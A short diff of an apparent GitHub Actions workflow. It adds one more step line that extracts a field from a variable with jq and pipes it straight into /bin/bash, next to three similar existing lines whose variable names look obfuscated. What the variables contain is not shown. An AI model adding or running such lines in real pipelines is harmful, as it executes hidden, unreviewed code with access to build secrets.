@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$pnplf20" | jq -r .fyie0646 | /bin/bash
           printf '%s' "$qaf54791" | jq -r .foq81 | /bin/bash
           printf '%s' "$dcdhv184" | jq -r .jemd898 | /bin/bash
+          echo $m07 | jq -r .rl107 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
